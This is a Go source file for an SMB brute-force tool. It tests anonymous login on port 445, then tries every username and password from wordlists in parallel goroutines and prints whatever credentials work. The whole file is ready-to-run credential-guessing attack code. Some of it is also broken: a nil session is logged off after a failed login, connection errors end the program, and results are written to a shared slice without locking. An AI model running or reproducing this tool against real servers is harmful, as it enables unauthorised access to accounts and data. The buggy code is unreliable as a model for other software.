package scanners

import (
	"bufio"
	"context"
	"fmt"
	"log"
	"net"
	"os"
	"strings"
	"sync"
	"sync/atomic"
	"time"

	"github.com/hirochachacha/go-smb2"
	"golang.org/x/sync/semaphore"
)

var completed uint32
var total uint32

// LoadUsers loads users from a file
func LoadUsers(filename string) ([]string, error) {
	file, err := os.Open(filename)
	if err != nil {
		return nil, err
	}
	defer file.Close()

	var users []string
	scanner := bufio.NewScanner(file)
	for scanner.Scan() {
		users = append(users, strings.TrimSpace(scanner.Text()))
	}
	return users, scanner.Err()
}

// LoadPasswords loads passwords from a file
func LoadPasswords(filename string) ([]string, error) {
	file, err := os.Open(filename)
	if err != nil {
		return nil, err
	}
	defer file.Close()

	var passwords []string
	scanner := bufio.NewScanner(file)
	for scanner.Scan() {
		passwords = append(passwords, strings.TrimSpace(scanner.Text()))
	}
	return passwords, scanner.Err()
}

// Check for anonymous login
func checkAnonymousLogin(target string) bool {
	// SMB server details
	username := "anonymous"
	password := "anonymous"
	//domain := "WORKGROUP" // Default SMB domain, can be left empty if not used

	// Create a TCP connection to the SMB server
	conn, err := net.DialTimeout("tcp", target, 5*time.Second)
	if err != nil {
		log.Fatalf("[!] Failed to connect to server: %v", err)
	}
	defer conn.Close()

	// Setup SMB2 Dialer
	d := &smb2.Dialer{
		Initiator: &smb2.NTLMInitiator{
			User:     username,
			Password: password,
		},
	}

	// Dial the SMB server to create a session
	s, err := d.Dial(conn)
	if err != nil {
		// log.Fatalf("[-] Failed to initiate anonymous SMB session: %v", err)
		return false
	}
	defer s.Logoff()

	// If no error, it means the login was successful
	// fmt.Println("[+] Successfully logged anonymously into SMB server!")
	return true
}

// Attempt to login with the provided username and password
func tryLogin(target, user, pass string) bool {
	// Create a TCP connection to the SMB server
	conn, err := net.DialTimeout("tcp", target, 5*time.Second)
	if err != nil {
		log.Fatalf("[-] Failed to connect to server: %v", err)
	}
	defer conn.Close()

	// Setup SMB2 Dialer
	d := &smb2.Dialer{
		Initiator: &smb2.NTLMInitiator{
			User:     user,
			Password: pass,
		},
	}

	// Dial the SMB server to create a session
	s, err := d.Dial(conn)
	if err == nil {
		// fmt.Println("[+] Successfully logged into SMB server!")
		return true
	}
	defer s.Logoff()

	return false
}

func printProgress() {
	fmt.Printf("\r[?] Progress: %.2f%%", getProgress())
}

func getProgress() float64 {
	if total == 0 {
		return 0.0
	}
	completedCount := atomic.LoadUint32(&completed)
	return (float64(completedCount) / float64(total)) * 100
}

func SMBBruteForce_Init(target string, userFile string, passFile string, maxThreads int) (bool, string, string) {
	target = target + ":445"

	users, err := LoadUsers(userFile)
	if err != nil {
		fmt.Println("[X] Error loading users:", err)
		return false, "", ""
	}

	passwords, err := LoadPasswords(passFile)
	if err != nil {
		fmt.Println("[X] Error loading passwords:", err)
		return false, "", ""
	}

	total = uint32(len(users) * len(passwords))
	fmt.Printf("[*] Total Usernames: %d\n", len(users))
	fmt.Printf("[*] Total Passwords: %d\n", len(passwords))
	fmt.Printf("[*] Total Combinations: %d\n", total)

	var wg sync.WaitGroup
	sem := semaphore.NewWeighted(int64(maxThreads))

	var anonymous bool

	fmt.Println("[!] Checking Anonymous Login")
	// Check for anonymous login
	if checkAnonymousLogin(target) {
		fmt.Println("[+] Anonymous login available")
		anonymous = true

		return true, "anonymous", "anonymous"
	} else {
		fmt.Println("[*] No anonymous login available, starting with user/password combinations.")
	}

	if !anonymous {
		// Start progress ticker
		ticker := time.NewTicker(1 * time.Second)
		defer ticker.Stop()

		go func() {
			for range ticker.C {
				printProgress()
			}
		}()

		var validCreds []string

		// Brute-force attempts
		for _, user := range users {
			for _, pass := range passwords {
				sem.Acquire(context.TODO(), 1)
				wg.Add(1)
				go func(user, pass string) {
					defer sem.Release(1)
					defer wg.Done()
					if tryLogin(target, user, pass) {
						fmt.Printf("[+] Success: %s:%s\n", user, pass)
						validCreds = append(validCreds, user)
						validCreds = append(validCreds, pass)
					}
					atomic.AddUint32(&completed, 1)
				}(user, pass)
			}
		}

		wg.Wait()
		fmt.Println("\n[!] Brute force attack completed.")

		if len(validCreds) > 0 {
			return true, validCreds[0], validCreds[1]
		}
	}

	return false, "", ""
}
